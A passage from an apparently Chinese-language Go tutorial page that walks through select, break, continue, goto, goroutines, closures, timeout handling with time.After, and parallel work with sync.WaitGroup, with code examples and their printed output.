closed</span></span><br><span class="line"><span class="comment">ch2 closed</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-select-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consumer</span><span class="params">(ch &lt;-<span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> value := <span class="keyword">range</span> ch &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;consumer:&quot;</span>, value)</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> consumer(ch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> ch &lt;- i:</span><br><span class="line">            fmt.Println(<span class="string">&quot;producer:&quot;</span>, i)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;channel is full&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line"></span><br><span class="line">    time.Sleep(time.Second * <span class="number">8</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">producer: 0</span></span><br><span class="line"><span class="comment">producer: 1</span></span><br><span class="line"><span class="comment">producer: 2</span></span><br><span class="line"><span class="comment">channel is full</span></span><br><span class="line"><span class="comment">channel is full</span></span><br><span class="line"><span class="comment">consumer: 0</span></span><br><span class="line"><span class="comment">consumer: 1</span></span><br><span class="line"><span class="comment">consumer: 2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><ul>
<li>可用于中断 for、switch 和 select 流程</li>
<li>支持可选的 label 标识跳出的第几层循环</li>
</ul>
<div class="tabs" id="cs-break"><ul class="nav-tabs"><li class="tab active"><a href="#cs-break-1">General</a></li><li class="tab"><a href="#cs-break-2">WithLabel</a></li></ul><div class="tab-content"><div class="tab-pane active" id="cs-break-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// for</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">5</span> &#123;</span><br><span class="line">        <span class="keyword">break</span> <span class="comment">// terminates the loop</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch</span></span><br><span class="line"><span class="keyword">switch</span> day := <span class="string">&quot;Monday&quot;</span>; day &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Monday&quot;</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Today is Monday.&quot;</span>)</span><br><span class="line">    <span class="keyword">break</span> <span class="comment">// terminates the switch statement</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Tuesday&quot;</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Today is Tuesday.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// select</span></span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ch:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Received a value from channel.&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(time.Second):</span><br><span class="line">    fmt.Println(<span class="string">&quot;Timeout.&quot;</span>)</span><br><span class="line">    <span class="keyword">break</span> <span class="comment">// terminates the select statement</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cs-break-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    outerLoop:</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">            <span class="keyword">if</span> i*j &gt;= <span class="number">4</span> &#123;</span><br><span class="line">                <span class="keyword">break</span> outerLoop</span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;%d &quot;</span>, i*j)</span><br><span class="line">            <span class="comment">// 0 0 0</span></span><br><span class="line">            <span class="comment">// 0 1 2</span></span><br><span class="line">            <span class="comment">// 0 2</span></span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h2><ul>
<li>只用于 for 流程中</li>
<li>支持可选的 label 标识在哪个位置继续</li>
</ul>
<div class="tabs" id="cs-continue"><ul class="nav-tabs"><li class="tab active"><a href="#cs-continue-1">WithLabel</a></li></ul><div class="tab-content"><div class="tab-pane active" id="cs-continue-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    outerLoop:</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">            <span class="keyword">if</span> i*j &gt;= <span class="number">4</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span> outerLoop</span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;%d &quot;</span>, i*j)</span><br><span class="line">            <span class="comment">// 0 0 0</span></span><br><span class="line">            <span class="comment">// 0 1 2</span></span><br><span class="line">            <span class="comment">// 0 2 0 3 0</span></span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h2><ul>
<li>goto 语句可以跳转到指定标签的位置，在某些情况下可以使代码更简洁高效</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    i := <span class="number">0</span></span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">3</span> &#123;</span><br><span class="line">        <span class="keyword">goto</span> end</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(i)</span><br><span class="line">    i++</span><br><span class="line">    <span class="keyword">goto</span> start</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">    fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">done</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="go"><a href="#go" class="headerlink" title="go"></a>go</h2><ul>
<li>Go 语句（go statements）提供了一种创建和启动 goroutine 的方式，可以在单个程序中并发执行多个任务<ul>
<li>goroutine 执行函数的返回值可以通过通道（channel）来传递</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-goroutine"><ul class="nav-tabs"><li class="tab active"><a href="#go-goroutine-1">Basic</a></li><li class="tab"><a href="#go-goroutine-2">ReturnByChannel</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-goroutine-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">task</span><span class="params">(name <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        fmt.Println(name)</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> task(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    <span class="keyword">go</span> task(<span class="string">&quot;B&quot;</span>)</span><br><span class="line"></span><br><span class="line">    time.Sleep(time.Second * <span class="number">4</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">B</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">B</span></span><br><span class="line"><span class="comment">B</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">done</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-goroutine-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">task</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">    <span class="keyword">return</span> n * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        result := task(<span class="number">10</span>)</span><br><span class="line">        ch &lt;- result</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        result := task(<span class="number">20</span>)</span><br><span class="line">        ch &lt;- result</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    result1 := &lt;-ch</span><br><span class="line">    result2 := &lt;-ch</span><br><span class="line"></span><br><span class="line">    fmt.Println(result1, result2) <span class="comment">// 20 40</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="goroutine"><a href="#goroutine" class="headerlink" title="goroutine"></a>goroutine</h3><ul>
<li>goroutine 模型：它是一个在同一地址空间中与其他 goroutine 并发（concurrent）执行的函数<ul>
<li>内存很轻量，起初只占用少量 stack 空间，后续按需分配或释放 heap 空间</li>
<li>goroutines 被多路复用（multiplexed）到多个 OS 线程（multi-threads）上</li>
<li>goroutine 概念严格来说不同于 thread、coroutine 和 process</li>
<li>goroutine 不可以从外部无条件地结束掉，只能通过 channel 来与它通信</li>
<li>程序初始时（<code>main()</code>）运行在一个 goroutine 上，后续可以创建新的 goroutine 以并发执行</li>
<li><code>go func()</code>语句会在一个新的 goroutine 中运行，且函数执行完成后，对应的 goroutine 也随之终止</li>
</ul>
</li>
<li>函数字面量（匿名函数）通常实现为闭包（closure）：确保 goroutine 执行时用到的外部变量仍然是 survive<ul>
<li>闭包（closure）是指一个函数与其引用的外部变量所组成的实体</li>
</ul>
</li>
<li>通道（channel）用于 goroutine 之间传递数据，以代替并发访问共享内存（shared memory）的编程方式</li>
</ul>
<div class="tabs" id="goroutine"><ul class="nav-tabs"><li class="tab active"><a href="#goroutine-1">Closure</a></li><li class="tab"><a href="#goroutine-2">HttpServer</a></li></ul><div class="tab-content"><div class="tab-pane active" id="goroutine-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// counter() is closure</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">counter</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    count := <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        count++</span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c1 := counter()</span><br><span class="line">    c2 := counter()</span><br><span class="line"></span><br><span class="line">    fmt.Println(c1()) <span class="comment">// 1</span></span><br><span class="line">    fmt.Println(c1()) <span class="comment">// 2</span></span><br><span class="line">    fmt.Println(c2()) <span class="comment">// 1</span></span><br><span class="line">    fmt.Println(c2()) <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="goroutine-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(ch <span class="keyword">chan</span> <span class="type">string</span>)</span></span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        ch &lt;- r.URL.Path</span><br><span class="line">        fmt.Fprintf(w, <span class="string">&quot;Path:%v Query:%v\n&quot;</span>, r.URL.Path, r.URL.RawQuery)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            msg := &lt;-ch</span><br><span class="line">            fmt.Println(<span class="string">&quot;received request:&quot;</span>, msg)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/&quot;</span>, handler(ch))</span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">$ curl &quot;http://localhost:8080/x/y/z?a=1&amp;b=2&amp;c=3&quot;</span></span><br><span class="line"><span class="comment">Path:/x/y/z Query:a=1&amp;b=2&amp;c=3</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div></div></div>

<h4 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h4><ul>
<li>利用 time.After 启动了一个异步的定时器（要避免永久阻塞在 channel 上）</li>
</ul>
<div class="tabs" id="goroutine-timeout"><ul class="nav-tabs"><li class="tab active"><a href="#goroutine-timeout-1">BadStyle</a></li><li class="tab"><a href="#goroutine-timeout-2">GoodStyle</a></li></ul><div class="tab-content"><div class="tab-pane active" id="goroutine-timeout-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doBad</span><span class="params">(done <span class="keyword">chan</span> <span class="type">bool</span>)</span></span> &#123;</span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">    done &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runBad</span><span class="params">(size <span class="type">int</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="comment">// BAD: unbufferd chan will block forever after timeout!</span></span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>, size)</span><br><span class="line">    <span class="keyword">go</span> doBad(done)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-done:</span><br><span class="line">        fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(time.Millisecond):</span><br><span class="line">        <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;timeout&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">testRun</span><span class="params">(t *testing.T, size <span class="type">int</span>, args ...any)</span></span> &#123;</span><br><span class="line">    t.Helper()</span><br><span class="line">    t.Log(<span class="string">&quot;S&gt;&quot;</span>, runtime.NumGoroutine())</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; size; i++ &#123;</span><br><span class="line">        <span class="keyword">switch</span> f := args[<span class="number">0</span>].(<span class="keyword">type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span>:</span><br><span class="line">            f()</span><br><span class="line">        <span class="keyword">case</span> <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">error</span>:</span><br><span class="line">            f(args[<span class="number">1</span>].(<span class="type">int</span>))</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Printf(<span class="string">&quot;%T&quot;</span>, size)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line">    t.Log(<span class="string">&quot;E&gt;&quot;</span>, runtime.NumGoroutine())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestTimeout1</span><span class="params">(t *testing.T)</span></span> &#123; testRun(t, <span class="number">1000</span>, runBad, <span class="number">0</span>) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestTimeout2</span><span class="params">(t *testing.T)</span></span> &#123; testRun(t, <span class="number">1000</span>, runBad, <span class="number">1</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">=== RUN   TestTimeout1</span></span><br><span class="line"><span class="comment">    routine_test.go:72: S&gt; 2</span></span><br><span class="line"><span class="comment">    routine_test.go:72: E&gt; 1002</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">=== RUN   TestTimeout2</span></span><br><span class="line"><span class="comment">    routine_test.go:73: S&gt; 2</span></span><br><span class="line"><span class="comment">    routine_test.go:73: E&gt; 2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="goroutine-timeout-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doGood</span><span class="params">(waitDone, done <span class="keyword">chan</span> <span class="type">bool</span>)</span></span> &#123;</span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> waitDone &lt;- <span class="literal">true</span>:</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">    done &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runGood</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    waitDone := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line">    <span class="keyword">go</span> doGood(waitDone, done)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-waitDone:</span><br><span class="line">        &lt;-done</span><br><span class="line">        fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(time.Millisecond):</span><br><span class="line">        <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;timeout&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">testRun</span><span class="params">(t *testing.T, size <span class="type">int</span>, args ...any)</span></span> &#123;</span><br><span class="line">    t.Helper()</span><br><span class="line">    t.Log(<span class="string">&quot;S&gt;&quot;</span>, runtime.NumGoroutine())</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; size; i++ &#123;</span><br><span class="line">        <span class="keyword">switch</span> f := args[<span class="number">0</span>].(<span class="keyword">type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span>:</span><br><span class="line">            f()</span><br><span class="line">        <span class="keyword">case</span> <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">error</span>:</span><br><span class="line">            f(args[<span class="number">1</span>].(<span class="type">int</span>))</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Printf(<span class="string">&quot;%T&quot;</span>, size)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line">    t.Log(<span class="string">&quot;E&gt;&quot;</span>, runtime.NumGoroutine())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestTimeout3</span><span class="params">(t *testing.T)</span></span> &#123; testRun(t, <span class="number">1000</span>, runGood) &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">=== RUN   TestTimeout3</span></span><br><span class="line"><span class="comment">    routine_test.go:74: S&gt; 2</span></span><br><span class="line"><span class="comment">    routine_test.go:74: E&gt; 2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div></div></div>

<h4 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h4><ul>
<li>一个 channel 有两个队列，分别存放发送和接收数据的 goroutine，这两个队列全为空时，通道才能被 GC 回收</li>
<li>一个 goroutine 处于任一通道的某个队列中时，此协程也不会被 GC 回收</li>
</ul>
<h4 id="并行性（Parallelization）"><a href="#并行性（Parallelization）" class="headerlink" title="并行性（Parallelization）"></a>并行性（Parallelization）</h4><ul>
<li>并行性（parallelization）指在多个 CPU 核心上进行运算<ul>
<li>如果一个问题可以分割成独立进行的多个片段（piece），就可以并行化处理它</li>
</ul>
</li>
<li>Go 是为并发性（concurrent）设计的语言，虽然也适合一部分并行任务，但并不是所有并行任务都适合用 Go 处理</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Vector []<span class="type">float64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v Vector)</span></span> DoSome(i, n <span class="type">int</span>, u Vector, c <span class="keyword">chan</span> <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">defer</span> wg.Done()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ; i &lt; n &amp;&amp; i &lt; <span class="built_in">len</span>(v); i++ &#123;</span><br><span class="line">        v[i] = <span class="number">2</span> * u[i]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    time.Sleep(time.Duration(i%<span class="number">2</span>) * time.Second)</span><br><span class="line"></span><br><span class="line">    c &lt;- <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    v1 := Vector&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">    v2 := Vector&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line"></span><br><span class="line">    numCPU := runtime.NumCPU()</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, numCPU) <span class="comment">// (only used when need to receive return values)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// separate pieces (parallelize calc)</span></span><br><span class="line">    chunkSize := (<span class="built_in">len</span>(v1) + <span class="built_in">len</span>(v1)%numCPU) / numCPU</span><br><span class="line">    fmt.Printf(<span class="string">&quot;numCPU:%v chunkSize:%v\n&quot;</span>, numCPU, chunkSize) <span class="comment">// numCPU:4 chunkSize:3</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; numCPU; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> v1.DoSome(i*chunkSize, (i+<span class="number">1</span>)*chunkSize, v2, c)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait all goroutine finished</span></span><br><span class="line">    wg.Wait()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// receive all of return values (not need in this example)</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; numCPU; i++ &#123;</span><br><span class="line">        &lt;-c</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(v1) <span class="comment">// [0 2 4 6 8 10 12 14 16 18]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

